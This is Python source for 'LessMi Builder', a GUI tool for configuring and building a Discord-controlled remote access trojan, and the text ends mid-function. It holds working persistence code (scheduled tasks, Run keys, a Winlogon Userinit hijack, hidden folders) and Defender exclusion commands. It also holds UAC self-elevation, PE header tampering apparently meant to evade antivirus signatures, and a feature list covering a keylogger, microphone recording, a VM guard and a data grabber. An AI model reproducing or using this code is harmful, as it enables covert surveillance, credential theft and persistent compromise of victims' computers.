#  __  __       _          _    ____
# |  \/  | __ _| |_ ___   / \  / ___|
# | |\/| |/ _` | __/ _ \ / _ \| |  _
# | |  | | (_| | ||  __// ___ \ |_| |
# |_|  |_|\__,_|\__\___/_/   \_\____|
#
# (c) Copyright 2026 - MateAG
# All rights reserved. Any copy without
# consent of this code will be reported.
#
# This project is only for educational purposes.
# The creator is NOT responsible of any illegal/malicious use
# of this project.
#
# The creator advices you to use this for testing and
# legal activities. If you want to install this on
# someone else computer, please ask them for the
# permission to.
#
# Thank you and happy testing! <3

import ctypes
import hashlib
import json
import os
import platform
import queue
import random
import re
import math
import wave
import shutil
import string
import struct
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request
from io import BytesIO

import tkinter
import tkinter.filedialog
import customtkinter as ctk

AUDIO_BACKEND = None
pygame = None
winsound = None
try:
    import pygame
    pygame.mixer.pre_init(44100, -16, 2, 512)
    pygame.mixer.init()
    pygame.mixer.set_num_channels(48)
    AUDIO_BACKEND = "pygame"
except Exception:
    pygame = None
    if os.name == "nt":
        try:
            import winsound
            AUDIO_BACKEND = "winsound"
        except Exception:
            AUDIO_BACKEND = None

ctk.set_appearance_mode("Dark")

APP_NAME = "LessMi Builder"
VERSION = "Beta v2.5"

BG = "#07070a"
PANEL = "#0e0e13"
PANEL_2 = "#111118"
BORDER = "#1b1b24"
TEXT = "#f2f2f7"
MUTED = "#7a7a8c"
DIM = "#5a5a6e"

ACCENTS = ["#b9a8ff", "#a8d8ff", "#ffb9e6", "#a8ffd8", "#ffe0a8"]

SUCCESS = "#7ef0b0"

LOGO_URL = "https://raw.githubusercontent.com/MateAGYT/LessMi/main/resources/logo.png"
LOCAL_LOGO = os.path.join("resources", "logo.png")

APPDATA_DIR = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), "LessMi")
CACHE_LOGO = os.path.join(APPDATA_DIR, "logo.png")
CACHE_ICO = os.path.join(APPDATA_DIR, "app.ico")
PERSIST_STATE = os.path.join(APPDATA_DIR, "persist.json")
FILTER_STATE = os.path.join(APPDATA_DIR, "filters.json")
SFX_DIR = os.path.join(tempfile.gettempdir(), "lessmi_sfx")

SOURCE_FILE = "source_assembled.py"
RUN_KEY_BUILDER = r"Software\Microsoft\Windows\CurrentVersion\Run"

SOUND_URLS = [
    "https://www.myinstants.com/media/sounds/creamy-keyboard-once.mp3",
    "https://www.myinstants.com/media/sounds/creamy-keyboard-v7.mp3",
    "https://www.myinstants.com/media/sounds/galaxy-s25-keypress-retro-theme.mp3",
]

PYI_MAGIC = b"MEI\x0c\x0b\x0a\x0b\x0e"

MARK = "#~ "

CHUNK = 24
ROW_LIMIT = 90

COMMAND_RE = re.compile(r"^@bot\.(command|group)\b")
ALIAS_RE = re.compile(r"aliases\s*=\s*(\[[^\]]*\]|\"[^\"]*\"|'[^']*')")
DEF_RE = re.compile(r"^(?:async\s+)?def\s+([A-Za-z_][A-Za-z0-9_]*)\s*\(")

FEATURES = [
    {"id": "vmguard", "label": "VM guard", "group": "STARTUP",
     "desc": "Exit instantly when a sandbox or VM is detected.", "pat": r"^vm_guard\(\)\s*$", "mode": "line"},
    {"id": "boot", "label": "Boot chain", "group": "STARTUP",
     "desc": "Mutex, app data directory and general bootstrap.", "pat": r"^boot\(\)\s*$", "mode": "line"},
    {"id": "elevate", "label": "Auto elevation (UAC)", "group": "STARTUP",
     "desc": "Relaunch the process asking for admin rights.", "pat": r"^\s{4}if not _is_admin\(\) and ELEVATED_FLAG", "mode": "block"},
    {"id": "persist", "label": "Persistence", "group": "STARTUP",
     "desc": "Copy to disk and call setup_persistence().", "pat": r"^setup_persistence\(\)\s*$", "mode": "line"},
    {"id": "userinit", "label": "Userinit hijack", "group": "STARTUP",
     "desc": "Append the exe to Winlogon\\Userinit.", "pat": r"^\s+install_userinit\(\)\s*$", "mode": "line"},
    {"id": "tasks", "label": "Scheduled tasks", "group": "STARTUP",
     "desc": "schtasks ONLOGON / ONSTART.", "pat": r"^\s+_task_create\(", "mode": "line"},
    {"id": "runkeys", "label": "Run keys", "group": "STARTUP",
     "desc": "HKLM and HKCU CurrentVersion\\Run.", "pat": r"^\s+_reg_add\(RUN_KEY", "mode": "line"},
    {"id": "launcher", "label": "VBS launcher", "group": "STARTUP",
     "desc": "Watchdog script in the Startup folder.", "pat": r"^\s+_make_launcher\(", "mode": "line"},
    {"id": "avexcl", "label": "Defender exclusions", "group": "STARTUP",
     "desc": "Add-MpPreference for folder and process.", "pat": r"^\s+_ps\(f'Add-MpPreference", "mode": "line"},

    {"id": "vmkill", "label": "VM_KILL active", "group": "RUNTIME",
     "desc": "Constant that drives the VM guard.", "pat": r"^VM_KILL\s*=", "mode": "line"},
    {"id": "keylogger", "label": "Keylogger", "group": "RUNTIME",
     "desc": "Global keyboard listener.", "pat": r"^\s*threading\.Thread\(target=keylogger_thread", "mode": "line"},
    {"id": "keyflush", "label": "Key flush", "group": "RUNTIME",
     "desc": "Periodic buffer flush to the keys channel.", "pat": r"^\s*threading\.Thread\(target=send_keys_periodically", "mode": "line"},
    {"id": "micrec", "label": "Mic recording", "group": "RUNTIME",
     "desc": "Automatic clips every 2 minutes.", "pat": r"^\s*threading\.Thread\(target=record_mic_thread", "mode": "line"},
    {"id": "blacklist", "label": "Blacklist watcher", "group": "RUNTIME",
     "desc": "Kill processes found on the blacklist.", "pat": r"^\s*threading\.Thread\(target=(?:check_blacklist|blacklist_watcher)", "mode": "line"},

    {"id": "presence", "label": "DND presence", "group": "DISCORD",
     "desc": "Set the bot status to \"LessMi RAT\".", "pat": r"^\s+await bot\.change_presence\(", "mode": "block"},
    {"id": "panel", "label": "Embed panel", "group": "DISCORD",
     "desc": "Button embeds in the panel channel.", "pat": r"^\s+if panel_ch:\s*$", "mode": "block"},
    {"id": "infoch", "label": "Info dump", "group": "DISCORD",
     "desc": "post_info_channel with systeminfo.", "pat": r"^\s*bot\.loop\.create_task\(post_info_channel", "mode": "line"},
]

HELP_CATEGORIES = {
    "ss": "screen", "screenrec": "screen", "camrec": "screen", "webcam": "screen",
    "list-cams": "screen", "sel-cam": "screen", "show-screens": "screen",
    "screen-mode": "screen", "rotate": "screen", "resolution": "screen",
    "monitors-off": "screen", "monitors-on": "screen", "screensaver": "screen",
    "set-wallpaper": "screen", "wallpaper-random": "screen", "play": "screen",
    "tts": "screen", "beep": "screen", "jumpscare": "screen",
    "block-input": "input", "unblock-input": "input", "hide-cursor": "input",
    "show-cursor": "input", "key": "input", "click": "input",
    "click-delete": "input", "autoclick": "input", "mouse-speed": "input",
    "swap-mouse": "input", "alt-f4": "input", "minimize-all": "input",
    "taskbar": "input", "desktop-icons": "input", "unpin-all": "input",
    "restart-taskbar": "input", "capslock": "input", "numlock": "input",
    "scrolllock": "input", "sticky-keys": "input",
    "list-mics": "voice", "sel-mic": "voice", "list-speakers": "voice",
    "set-speaker": "voice", "join": "voice", "disconnect": "voice",
    "record": "voice", "mic-record": "voice", "volume": "voice",
    "vol-step": "voice", "mute": "voice", "night-light": "voice",
    "tasklist": "processes", "proc-info": "processes", "taskkill": "processes",
    "kill-tree": "processes", "kill-explorer": "processes",
    "start-explorer": "processes", "set-critical": "processes",
    "unset-critical": "processes", "services": "processes", "startup": "processes",
    "window-list": "processes", "focus": "processes", "close-window": "processes",
    "drivers": "processes", "events": "processes",
    "ls": "files", "cd": "files", "tree": "files", "cat": "files",
    "mkdir": "files", "mkfile": "files", "remove": "files", "move": "files",
    "copy": "files", "rename": "files", "size": "files", "hash": "files",
    "search": "files", "zip": "files", "unzip": "files", "download": "files",
    "upload": "files", "grab-url": "files", "open": "files", "run": "files",
    "recent": "files", "usb": "files", "empty-temp": "files", "hosts": "files",
    "clear-bin": "files", "mount": "files", "unmount": "files",
    "grab": "grab", "grabber": "grab",
}

CATEGORY_LABELS = {
    "screen": "SCREEN & MEDIA", "input": "INPUT", "voice": "VOICE",
    "processes": "PROCESSES", "files": "FILESYSTEM", "grab": "GRABBER",
    "misc": "MISC",
}


def _rnd(n):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(n))


def _tint(hex_color, factor):
    r, g, b = int(hex_color[1:3], 16), int(hex_color[3:5], 16), int(hex_color[5:7], 16)
    br, bgc, bb = 0x07, 0x07, 0x0a
    return "#{:02x}{:02x}{:02x}".format(
        int(br + (r - br) * factor), int(bgc + (g - bgc) * factor), int(bb + (b - bb) * factor))


def _hex_rgb(value):
    value = value.lstrip("#")
    return int(value[0:2], 16), int(value[2:4], 16), int(value[4:6], 16)


def _rgb_hex(r, g, b):
    return "#{:02x}{:02x}{:02x}".format(
        max(0, min(255, int(r))), max(0, min(255, int(g))), max(0, min(255, int(b))))


def _mix(start, end, t):
    try:
        ar, ag, ab = _hex_rgb(start)
        br, bg, bb = _hex_rgb(end)
    except Exception:
        return end
    return _rgb_hex(ar + (br - ar) * t, ag + (bg - ag) * t, ab + (bb - ab) * t)


def is_admin():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def resolve_logo():
    for candidate in (LOCAL_LOGO, CACHE_LOGO):
        try:
            if os.path.exists(candidate) and os.path.getsize(candidate) > 512:
                return candidate
        except Exception:
            pass
    try:
        os.makedirs(APPDATA_DIR, exist_ok=True)
        req = urllib.request.Request(LOGO_URL, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = resp.read()
        if len(data) > 512:
            with open(CACHE_LOGO, "wb") as f:
                f.write(data)
            return CACHE_LOGO
    except Exception:
        pass
    return None


def ensure_ico(png_path):
    if not png_path or not os.path.exists(png_path):
        return None
    try:
        if os.path.exists(CACHE_ICO) and os.path.getsize(CACHE_ICO) > 2048:
            return CACHE_ICO
        from PIL import Image
        os.makedirs(APPDATA_DIR, exist_ok=True)
        img = Image.open(png_path).convert("RGBA")
        img.save(CACHE_ICO, format="ICO",
                 sizes=[(16, 16), (24, 24), (32, 32), (48, 48), (64, 64), (128, 128), (256, 256)])
        return CACHE_ICO if os.path.exists(CACHE_ICO) else None
    except Exception:
        return None


def _load_photo(path, size):
    try:
        from PIL import Image
        img = Image.open(path).convert("RGBA")
        img = img.resize((size, size), Image.LANCZOS)
        return ctk.CTkImage(light_image=img, dark_image=img, size=(size, size))
    except Exception:
        pass
    try:
        raw = tkinter.PhotoImage(file=path)
        factor = max(1, int(round(raw.width() / float(size))))
        return raw.subsample(factor, factor)
    except Exception:
        return None


def _load_icon_photo(path, size):
    try:
        from PIL import Image, ImageTk
        img = Image.open(path).convert("RGBA")
        img = img.resize((size, size), Image.LANCZOS)
        return ImageTk.PhotoImage(img)
    except Exception:
        pass
    try:
        raw = tkinter.PhotoImage(file=path)
        factor = max(1, int(round(raw.width() / float(size))))
        return raw.subsample(factor, factor)
    except Exception:
        return None


def _load_persist():
    try:
        with open(PERSIST_STATE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}


def _save_persist(data):
    try:
        os.makedirs(APPDATA_DIR, exist_ok=True)
        with open(PERSIST_STATE, "w", encoding="utf-8") as f:
            json.dump(data, f)
    except Exception:
        pass


def _userinit(on):
    key = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0,
                           winreg.KEY_READ | winreg.KEY_SET_VALUE)
        cur = winreg.QueryValueEx(k, "Userinit")[0]
        exe = _load_persist().get("exe")
        if on:
            if exe and exe.lower() not in cur.lower():
                winreg.SetValueEx(k, "Userinit", 0, winreg.REG_SZ,
                                  '"{}", C:\\Windows\\System32\\userinit.exe,'.format(exe))
        else:
            if exe and exe.lower() in cur.lower():
                winreg.SetValueEx(k, "Userinit", 0, winreg.REG_SZ,
                                  r"C:\Windows\System32\userinit.exe,")
        winreg.CloseKey(k)
    except Exception:
        pass


def _mp_add(paths, tries=5):
    added = 0
    for p in paths:
        p = os.path.expandvars(p)
        for i in range(tries):
            subprocess.run(
                ["powershell", "-NoProfile", "-Command",
                 'Add-MpPreference -ExclusionPath "{0}" -ErrorAction SilentlyContinue;'
                 'Add-MpPreference -ExclusionProcess "{0}" -ErrorAction SilentlyContinue'.format(p)],
                capture_output=True, creationflags=0x08000000)
            chk = subprocess.run(
                ["powershell", "-NoProfile", "-Command", '(Get-MpPreference).ExclusionPath -join "`n"'],
                capture_output=True, text=True, creationflags=0x08000000)
            if p.lower() in (chk.stdout or "").lower():
                added += 1
                break
            time.sleep(1.5 + i)
    return added


def cleanup_old_persistence():
    state = _load_persist()
    _userinit(False)
    for task in state.get("tasks", []):
        try:
            subprocess.run(["schtasks", "/Delete", "/TN", task, "/F"], capture_output=True)
        except Exception:
            pass
    folder = state.get("folder")
    if folder and os.path.isdir(folder):
        try:
            shutil.rmtree(folder)
        except Exception:
            pass
    _save_persist({})


def install_persistence(exe_path, bundle_dir=None, runtime_dir=None):
    if not is_admin():
        return "no-admin"
    try:
        cleanup_old_persistence()

        folder = _rnd(10)
        target_dir = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), "Microsoft", folder)
        os.makedirs(target_dir, exist_ok=True)
        target_exe = os.path.join(target_dir, _rnd(9) + ".exe")

        targets = [target_dir, target_exe]
        if runtime_dir:
            targets.append(os.path.expandvars(runtime_dir))
        excluded = _mp_add(targets)

        if bundle_dir and os.path.isdir(bundle_dir):
            shutil.copytree(
                bundle_dir, target_dir, dirs_exist_ok=True,
                ignore=shutil.ignore_patterns("build", "*.spec", "source_final.py"),
            )
            target_exe = os.path.join(target_dir, os.path.basename(exe_path))
        elif exe_path and os.path.exists(exe_path):
            shutil.copy2(exe_path, target_exe)
        else:
            return "fail"

        _mp_add([target_exe])

        tasks = []
        name = _rnd(12)
        subprocess.run(
            ["schtasks", "/Create", "/TN", name, "/TR", target_exe,
             "/SC", "ONLOGON", "/RL", "HIGHEST", "/F", "/DELAY", "0000:30"],
            capture_output=True,
        )
        tasks.append(name)

        try:
            import winreg
            winreg.CloseKey(winreg.CreateKeyEx(
                winreg.HKEY_CURRENT_USER, RUN_KEY_BUILDER, 0, winreg.KEY_SET_VALUE))
        except Exception:
            pass
        subprocess.run(
            ["reg", "add", "HKCU\\" + RUN_KEY_BUILDER, "/v", folder,
             "/t", "REG_SZ", "/d", '"{}"'.format(target_exe), "/f"],
            capture_output=True)

        subprocess.run(["attrib", "+h", "+s", target_dir], capture_output=True)
        subprocess.run(["attrib", "+h", "+s", target_exe], capture_output=True)

        _save_persist({"folder": target_dir, "tasks": tasks, "exe": target_exe})
        _userinit(True)

        if excluded:
            return "ok"
        return "ok-noav"
    except Exception:
        return "fail"


def _rekey_rich(data, pe):
    try:
        rich = data.rfind(b"Rich", 0x40, pe)
        if rich < 0 or rich + 8 > pe:
            return
        old_key = struct.unpack("<I", bytes(data[rich + 4:rich + 8]))[0]
        marker = struct.pack("<I", 0x536E6144 ^ old_key)
        start = data.rfind(marker, 0x40, rich)
        if start < 0:
            return
        new_key = random.getrandbits(32)
        delta = old_key ^ new_key
        for off in range(start, rich - 3, 4):
            val = struct.unpack_from("<I", data, off)[0] ^ delta
            struct.pack_into("<I", data, off, val)
        struct.pack_into("<I", data, rich + 4, new_key)
    except Exception:
        pass


def harden_exe(path):
    try:
        with open(path, "rb") as f:
            data = bytearray(f.read())

        if len(data) < 0x200 or data[:2] != b"MZ":
            return False

        pe = struct.unpack_from("<I", data, 0x3C)[0]
        if data[pe:pe + 4] != b"PE\0\0":
            return False

        coff = pe + 4
        opt = coff + 20
        magic = struct.unpack_from("<H", data, opt)[0]
        if magic == 0x10B:
            dd = opt + 96
        elif magic == 0x20B:
            dd = opt + 112
        else:
            return False

        num_sec = struct.unpack_from("<H", data, coff + 2)[0]
        opt_size = struct.unpack_from("<H", data, coff + 16)[0]
        if num_sec < 1 or num_sec > 96:
            return False

        sec_tab = opt + opt_size
        if sec_tab + num_sec * 40 > len(data):
            return False

        struct.pack_into("<I", data, coff + 4, random.randint(0x5A000000, 0x6A000000))
        struct.pack_into("<I", data, opt + 64, 0)

        ends = []
        for i in range(num_sec):
            off = sec_tab + i * 40
            raw_size = struct.unpack_from("<I", data, off + 16)[0]
            raw_ptr = struct.unpack_from("<I", data, off + 20)[0]
            if raw_size and raw_ptr and raw_ptr < len(data):
                ends.append(min(raw_ptr + raw_size, len(data)))
            name = "." + "".join(random.choice(string.ascii_letters) for _ in range(6))
            data[off:off + 8] = name.encode().ljust(8, b"\0")[:8]

        _rekey_rich(data, pe)

        if ends:
            cut = max(ends)
            if 0 < cut < len(data):
                pad = os.urandom(random.randint(512, 4096))
                if data.endswith(PYI_MAGIC):
                    cookie = len(data) - 24
                    if cookie > cut:
                        pkg = struct.unpack_from("<I", data, cookie)[0]
                        struct.pack_into("<I", data, cookie, pkg + len(pad))
                data[cut:cut] = pad

        with open(path, "wb") as f:
            f.write(data)
        return True
    except Exception:
        return False


def build_tmpdir():
    return "%TEMP%\\" + "".join(random.choice(string.ascii_letters + string.digits) for _ in range(9))


TOKEN_RE = re.compile(r"^(?:mfa\.[\w\-]{80,}|[MN][\w\-]{23,}\.[\w\-]{6}\.[\w\-]{27,})$")


def _clean_token(raw):
    return (raw or "").strip().replace("\r", "").replace("\n", "").replace(" ", "")


def ensure_admin():
    if is_admin() or os.environ.get("LM_ELEV"):
        return
    try:
        os.environ["LM_ELEV"] = "1"
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable,
            " ".join('"{}"'.format(a) for a in sys.argv), os.getcwd(), 1)
        sys.exit(0)
    except Exception:
        pass


def parse_imports(path):
    args = []
    if not os.path.exists(path):
        return args
    with open(path, "r", encoding="utf-8") as f:
        for raw in f:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            if "=" in line:
                flag, value = line.split("=", 1)
                value = value.strip().strip('"').strip("'")
                flag = flag.strip()
                if flag in ("--add-data", "--add-binary"):
                    src = value.split(";")[0].split(":")[0]
                    if not os.path.exists(src):
                        continue
                args.append("{}={}".format(flag, value))
            else:
                args.append(line)
    return args


def human_size(n):
    for unit in ("B", "KB", "MB", "GB"):
        if n < 1024 or unit == "GB":
            return "{:.1f} {}".format(n, unit) if unit != "B" else "{} B".format(n)
        n /= 1024.0


def _indent(line):
    return len(line) - len(line.lstrip())


def _is_marked(line):
    return line.startswith(MARK)


def _strip_marker(line):
    return line[len(MARK):] if _is_marked(line) else line


def _block_bounds(lines, start):
    i = start
    while i < len(lines) and lines[i].lstrip().startswith("@"):
        i += 1
    base = _indent(lines[start])
    last = min(i, len(lines) - 1)
    j = i + 1
    while j < len(lines):
        raw = lines[j]
        if raw.strip():
            if _indent(raw) <= base:
                break
            last = j
        j += 1
    return start, last + 1


def scan_commands(lines):
    found = []
    for i, line in enumerate(lines):
        if not COMMAND_RE.match(line):
            continue
        j = i
        while j < len(lines) and lines[j].lstrip().startswith("@"):
            j += 1
        if j >= len(lines):
            continue
        m = DEF_RE.match(lines[j])
        if not m:
            continue
        aliases = []
        for d in range(i, j):
            am = ALIAS_RE.search(lines[d])
            if am:
                aliases.extend(re.findall(r"[\"']([^\"']+)[\"']", am.group(1)))
        start, end = _block_bounds(lines, i)
        found.append({"name": m.group(1), "aliases": aliases, "start": start, "end": end})
    return found


def load_filter_state():
    try:
        with open(FILTER_STATE, "r", encoding="utf-8") as f:
            data = json.load(f)
        return {
            "disabled_features": set(data.get("disabled_features", [])),
            "disabled_commands": set(data.get("disabled_commands", [])),
        }
    except Exception:
        return {"disabled_features": set(), "disabled_commands": set()}


def save_filter_state(state):
    try:
        os.makedirs(APPDATA_DIR, exist_ok=True)
        with open(FILTER_STATE, "w", encoding="utf-8") as f:
            json.dump({
                "disabled_features": sorted(state.get("disabled_features", [])),
                "disabled_commands": sorted(state.get("disabled_commands", [])),
            }, f, indent=1)
    except Exception:
        pass


def apply_filters(lines, disabled_features, disabled_commands):
    lines = [_strip_marker(l) for l in lines]
    off = set(disabled_features or ())
    off_cmd = set(disabled_commands or ())

    for cmd in scan_commands(lines):
        if cmd["name"] in off_cmd:
            for k in range(cmd["start"], cmd["end"]):
                lines[k] = MARK + lines[k]

    for feat in FEATURES:
        if feat["id"] not in off:
            continue
        rx = re.compile(feat["pat"])
        for idx in range(len(lines)):
            if not rx.search(lines[idx]):
                continue
            if _is_marked(lines[idx]):
                continue
            if feat["mode"] == "block":
                s, e = _block_bounds(lines, idx)
            else:
                s, e = idx, idx + 1
            for k in range(s, e):
                lines[k] = MARK + lines[k]

    if "persist" not in off:
        rx = re.compile(r"^setup_persistence\(\)\s*$")
        if not any(rx.match(l) for l in lines):
            for idx, line in enumerate(lines):
                if re.match(r"^boot\(\)\s*$", line):
                    lines.insert(idx + 1, "setup_persistence()\n")
                    break

    if any("target=check_blacklist" in l for l in lines) and \
            not any(re.match(r"^(?:async\s+)?def\s+check_blacklist\b", l) for l in lines):
        if not any(l.startswith("check_blacklist = blacklist_watcher") for l in lines):
            for idx, line in enumerate(lines):
                if line.startswith("if __name__"):
                    lines.insert(idx, "check_blacklist = blacklist_watcher\n")
                    break
    return lines


def apply_filters_to_file(path, state):
    if not os.path.exists(path):
        return False
    with open(path, "r", encoding="utf-8") as f:
        lines = f.readlines()
    out = apply_filters(lines, state["disabled_features"], state["disabled_commands"])
    with open(path, "w", encoding="utf-8") as f:
        f.writelines(out)
    return True


class FilterPopup(ctk.CTkToplevel):
    def __init__(self, app):
        super().__init__(app)
        self.app = app
        self.title("Source filter")
        self.configure(fg_color=BG)
        self.geometry("760x620")
        self.minsize(680, 520)
        self.transient(app)
        self.attributes("-alpha", 0.45)
        self.protocol("WM_DELETE_WINDOW", self.close)

        self._dead = False
        self._gen = 0
        self._plan = []
        self._grid_row = 0
        self._count = 0
        self._total = 0
        self._on = 0
        self._rows = []
        self._sx = 0
        self._search_job = None

        self.path = os.path.join(os.getcwd(), SOURCE_FILE)
        self.lines = []
        self.cmds = []
        self.filt = load_filter_state()
        self.tab = "commands"

        self._load()
        self._build()

        self.after(10, self._first_build)
        self.after(60, self._animate_in)
        self.after(90, self._grab)

    def _grab(self):
        try:
            self.grab_set()
        except Exception:
            pass

    def _load(self):
        try:
            with open(self.path, "r", encoding="utf-8") as f:
                self.lines = [_strip_marker(l) for l in f.readlines()]
        except Exception:
            self.lines = []
        self.cmds = scan_commands(self.lines)

    def _ordered_commands(self):
        buckets = {}
        for c in self.cmds:
            cat = "misc"
            for token in [c["name"]] + c["aliases"]:
                if token in HELP_CATEGORIES:
                    cat = HELP_CATEGORIES[token]
                    break
            buckets.setdefault(cat, []).append(c)
        order = ["screen", "input", "voice", "processes", "files", "grab", "misc"]
        return [(k, sorted(buckets[k], key=lambda x: x["name"])) for k in order if k in buckets]

    def _build(self):
        head = ctk.CTkFrame(self, fg_color=PANEL, corner_radius=0, border_width=0)
        head.pack(fill="x")
        head.grid_columnconfigure(0, weight=1)

        inner = ctk.CTkFrame(head, fg_color="transparent")
        inner.grid(row=0, column=0, padx=16, pady=(12, 10), sticky="ew")
        inner.grid_columnconfigure(0, weight=1)

        ctk.CTkLabel(inner, text="SOURCE FILTER",
                     font=ctk.CTkFont(family="Poppins", size=14, weight="bold"),
                     text_color=TEXT).grid(row=0, column=0, sticky="w")
        ctk.CTkLabel(inner, text=os.path.basename(self.path),
                     font=ctk.CTkFont(family="Poppins", size=9),
                     text_color=DIM).grid(row=1, column=0, sticky="w")

        self.lbl_count = ctk.CTkLabel(inner, text="",
                                      font=ctk.CTkFont(family="Poppins", size=9, weight="bold"),
                                      text_color=MUTED)
        self.lbl_count.grid(row=0, column=1, rowspan=2, padx=(0, 4), sticky="e")

        self.scanbar = ctk.CTkFrame(head, height=2, fg_color="#141420", corner_radius=1)
        self.scanbar.grid(row=1, column=0, sticky="ew")
        self.scan = ctk.CTkFrame(self.scanbar, height=2, width=140, fg_color=self.app.accent,
                                 corner_radius=1)
        self.scan.place(x=0, y=0)

        bar = ctk.CTkFrame(self, fg_color="transparent")
        bar.pack(fill="x", padx=16, pady=(10, 0))
        bar.grid_columnconfigure(1, weight=1)

        self.seg = ctk.CTkSegmentedButton(
            bar, values=["Commands", "Features"], height=30,
            command=self._switch_tab,
            font=ctk.CTkFont(family="Poppins", size=10, weight="bold"),
            corner_radius=8, fg_color=PANEL_2, unselected_color=PANEL_2,
            unselected_hover_color="#191922", selected_color="#2a2a3a",
            selected_hover_color="#33334a", text_color=TEXT)
        self.seg.set("Commands")
        self.seg.grid(row=0, column=0, sticky="w")

        self.search = ctk.CTkEntry(bar, height=30, corner_radius=8, border_width=1,
                                   fg_color="#0a0a0f", border_color=BORDER, text_color=TEXT,
                                   placeholder_text="search...",
                                   font=ctk.CTkFont(family="Poppins", size=11))
        self.search.grid(row=0, column=1, padx=(10, 10), sticky="ew")
        self.search.bind("<KeyRelease>", self._queue_search)

        btn_on = ctk.CTkButton(bar, text="ALL ON", command=lambda: self._bulk(True), width=62, height=30,
                               corner_radius=8, fg_color="transparent", hover_color="#191922",
                               border_width=1, border_color=BORDER, text_color=MUTED,
                               font=ctk.CTkFont(family="Poppins", size=9, weight="bold"))
        btn_on.grid(row=0, column=2)
        self.app.bind_hover(btn_on, "#0e0e13", "#191922", MUTED, TEXT)

        btn_off = ctk.CTkButton(bar, text="ALL OFF", command=lambda: self._bulk(False), width=62, height=30,
                                corner_radius=8, fg_color="transparent", hover_color="#191922",
                                border_width=1, border_color=BORDER, text_color=MUTED,
                                font=ctk.CTkFont(family="Poppins", size=9, weight="bold"))
        btn_off.grid(row=0, column=3, padx=(6, 0))
        self.app.bind_hover(btn_off, "#0e0e13", "#191922", MUTED, TEXT)

        self.scroll = ctk.CTkScrollableFrame(self, fg_color="transparent", corner_radius=0,
                                             scrollbar_button_color="#22222c",
                                             scrollbar_button_hover_color="#33333f")
        self.scroll.pack(fill="both", expand=True, padx=10, pady=(8, 0))
        self.scroll.grid_columnconfigure(0, weight=1)

        foot = ctk.CTkFrame(self, fg_color=PANEL, corner_radius=0)
        foot.pack(fill="x", pady=(8, 0))
        fin = ctk.CTkFrame(foot, fg_color="transparent")
        fin.pack(fill="x", padx=16, pady=10)

        btn_cancel = ctk.CTkButton(fin, text="CANCEL", command=self.close, width=100, height=34,
                                   corner_radius=999, fg_color="transparent", hover_color="#241a1a",
                                   border_width=1, border_color="#33262a", text_color="#ffb9a8",
                                   font=ctk.CTkFont(family="Poppins", size=10, weight="bold"))
        btn_cancel.pack(side="right")
        self.app.bind_hover(btn_cancel, "#0e0e13", "#241a1a", "#ffb9a8", "#ffd9cf")

        btn_apply = ctk.CTkButton(fin, text="APPLY", command=self.apply, width=150, height=34,
                                  corner_radius=999, fg_color=self.app.accent,
                                  hover_color=_tint(self.app.accent, 0.8),
                                  text_color="#0b0b10",
                                  font=ctk.CTkFont(family="Poppins", size=11, weight="bold"))
        btn_apply.pack(side="right", padx=(0, 10))
        self.app.bind_hover(btn_apply, self.app.accent, _tint(self.app.accent, 0.8), "#0b0b10", "#0b0b10")

        self._animate_scan()

    def _first_build(self):
        self._rebuild()
        self.focus_force()

    def _queue_search(self, event=None):
        if self._search_job:
            try:
                self.after_cancel(self._search_job)
            except Exception:
                pass
        self._search_job = self.after(130, self._rebuild)

    def _plan_rows(self):
        query = self.search.get().strip().lower()
        plan, total, on = [], 0, 0
        if self.tab == "commands":
            for cat, items in self._ordered_commands():
                vis = [c for c in items
                       if not query or query in (" ".join([c["name"]] + c["aliases"]).lower())]
                if not vis:
                    continue
                plan.append(("section", CATEGORY_LABELS.get(cat, cat.upper())))
                for c in vis:
                    total += 1
                    if c["name"] not in self.filt["disabled_commands"]:
                        on += 1
                    plan.append(("cmd", c))
        else:
            for group, items in self._feature_groups(query):
                plan.append(("section", group))
                for f in items:
                    total += 1
                    if f["id"] not in self.filt["disabled_features"]:
                        on += 1
                    plan.append(("feat", f))
        return plan, total, on

    def _feature_groups(self, query):
        groups = {}
        for f in FEATURES:
            if query and query not in (f["label"] + f["desc"] + f["id"]).lower():
                continue
            groups.setdefault(f["group"], []).append(f)
        return list(groups.items())

    def _rebuild(self):
        self._search_job = None
        self._gen += 1
        gen = self._gen
        for child in self.scroll.winfo_children():
            child.destroy()
        self._rows = []
        self._grid_row = 0
        self._count = 0
        self._plan, self._total, self._on = self._plan_rows()

        if not self._plan:
            self._section("NO RESULTS" if self.search.get().strip() else "NOTHING DETECTED")
            self._update_count()
            return

        self._pump(gen)

    def _pump(self, gen):
        if gen != self._gen or self._dead:
            return
        made = 0
        while self._plan and made < CHUNK and self._count < ROW_LIMIT:
            kind, payload = self._plan.pop(0)
            if kind == "section":
                self._section(payload)
            elif kind == "cmd":
                self._row_command(payload)
            else:
                self._row_feature(payload)
            made += 1
        if self._plan and self._count < ROW_LIMIT:
            self.after(1, lambda: self._pump(gen))
        else:
            if self._plan:
                self._section("... {} more, refine the search".format(len(self._plan)))
            self._update_count()
            self._animate_rows()

    def _update_count(self):
        text = "{} / {} enabled".format(self._on, self._total)
        if self._count and self._total > self._count:
            text += "  ·  showing {}".format(self._count)
        self.lbl_count.configure(text=text)

    def _section(self, text):
        head = ctk.CTkFrame(self.scroll, fg_color="transparent")
        head.grid(row=self._grid_row, column=0, padx=6, pady=(10, 2), sticky="w")
        ctk.CTkLabel(head, text=text, font=ctk.CTkFont(family="Poppins", size=9, weight="bold"),
                     text_color=DIM).pack()
        self._grid_row += 1

    def _row(self, title, subtitle, enabled, callback):
        box = ctk.CTkFrame(self.scroll, fg_color=PANEL, corner_radius=9, border_width=1,
                           border_color=BORDER)
        box.grid(row=self._grid_row, column=0, padx=2, pady=2, sticky="ew")
        box.grid_columnconfigure(0, weight=1)

        lbl = ctk.CTkLabel(box, text=title, anchor="w",
                           font=ctk.CTkFont(family="Consolas", size=11, weight="bold"),
